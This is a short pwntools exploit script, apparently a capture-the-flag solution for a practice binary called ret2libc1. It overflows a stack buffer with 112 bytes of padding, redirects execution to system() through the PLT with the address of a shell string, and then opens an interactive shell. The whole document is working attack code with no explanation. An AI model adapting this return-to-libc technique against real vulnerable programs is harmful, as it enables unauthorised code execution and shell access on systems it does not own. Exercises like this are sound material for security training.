from pwn import *

io = process("./ret2libc1")
elf = ELF('./ret2libc1')

context.log_level = 'debug'

sys_addr = elf.plt['system']
shell_addr = 0x08048720
put_addr = elf.plt['puts']
payload = b'a'*112+p32(sys_addr)+b'a'*4+p32(shell_addr)

io.recvuntil(b'C >_<')
io.sendline(payload)

io.interactive()